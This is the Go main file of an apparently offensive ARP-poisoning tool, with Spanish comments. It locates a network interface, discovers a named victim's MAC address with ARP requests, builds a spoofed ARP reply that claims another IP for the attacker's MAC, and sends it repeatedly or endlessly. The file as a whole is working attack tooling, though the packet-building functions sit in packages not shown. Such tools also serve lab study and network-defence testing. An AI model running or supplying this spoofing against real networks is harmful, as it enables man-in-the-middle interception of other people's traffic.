package main

import (
	"net"
	"os"

	"github.com/google/gopacket/pcap"
	"github.com/pol-p/go-arp-poisoning/internal/arp"
	"github.com/pol-p/go-arp-poisoning/internal/network"
	"github.com/pol-p/go-arp-poisoning/internal/ui"
	"github.com/pol-p/go-arp-poisoning/pkg/config"
)

func main() {
	ui.PrintBanner()

	cfg := config.ParseFlags()
	ui.PrintInterface(cfg.Interface)

	ui.PrintSearchingInterface()
	iface, err := network.GetInterface(cfg.Interface)
	if err != nil {
		ui.PrintError("Error al buscar interfaz", err)
		os.Exit(1)
	}
	ui.PrintInterfaceFound(iface.Name)

	// Obtener MAC local
	if cfg.SrcMAC == "" {
		ui.PrintGettingLocalMAC()
		cfg.SrcMAC = iface.HardwareAddr.String()
		ui.PrintLocalMAC(cfg.SrcMAC)
	} else {
		ui.PrintUsingProvidedMAC(cfg.SrcMAC)
	}

	// Obtener MAC de la víctima
	if cfg.DstMAC == "" {
		ui.PrintSearchingVictimMAC()
		handle, err := pcap.OpenLive(cfg.Interface, 1600, true, pcap.BlockForever)
		if err != nil {
			ui.PrintError("Error al abrir interfaz para ARP request", err)
			os.Exit(1)
		}
		defer handle.Close()

		handle.SetBPFFilter("arp")

		victimMAC, err := arp.DiscoverVictimMAC(handle, iface, net.ParseIP(cfg.VictimIP))
		if err != nil {
			ui.PrintError("No se pudo obtener la MAC de la víctima", err)
			os.Exit(1)
		}
		cfg.DstMAC = victimMAC.String()
		ui.PrintVictimMACFound(cfg.DstMAC)
	} else {
		ui.PrintUsingProvidedVictimMAC(cfg.DstMAC)
	}

	// Parsear MACs
	srcMAC, err := net.ParseMAC(cfg.SrcMAC)
	if err != nil {
		ui.PrintError("Error al parsear src-mac", err)
		os.Exit(1)
	}
	dstMAC, err := net.ParseMAC(cfg.DstMAC)
	if err != nil {
		ui.PrintError("Error al parsear dst-mac", err)
		os.Exit(1)
	}

	// Preparar paquete
	ui.PrintPreparingPacket()
	packetData, err := arp.CreateSpoofPacket(srcMAC, dstMAC, net.ParseIP(cfg.SpoofIP), net.ParseIP(cfg.VictimIP))
	if err != nil {
		ui.PrintError("Error al crear paquete", err)
		os.Exit(1)
	}

	// Abrir handle para envío
	handle, err := pcap.OpenLive(cfg.Interface, 1600, true, pcap.BlockForever)
	if err != nil {
		ui.PrintError("Error al abrir interfaz", err)
		os.Exit(1)
	}
	defer handle.Close()

	// Enviar paquetes
	if cfg.Infinite {
		ui.PrintSendingInfinite(cfg.Interval)
	} else {
		ui.PrintSendingCount(cfg.Count)
	}

	err = arp.SendPackets(handle, packetData, cfg.Count, cfg.Infinite, cfg.Interval)
	if err != nil {
		ui.PrintError("Error al enviar paquetes", err)
		os.Exit(1)
	}

	if !cfg.Infinite {
		ui.PrintPacketsSent(cfg.Count)
		ui.PrintFinish()
	}
}
